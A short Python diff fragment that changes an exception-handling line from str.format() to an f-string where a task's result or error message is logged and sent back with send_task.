                             if result != None:
                                 result = bytes().join(result)
                         except Exception as e:
-                            result = "{} error: {}".format(self.run.__name__, str(e)).encode()
+                            result = f"{self.run.__name__} error: {str(e)}".encode()
                             log(result)
                         task.update({'result': result})
                         self.send_task(task)
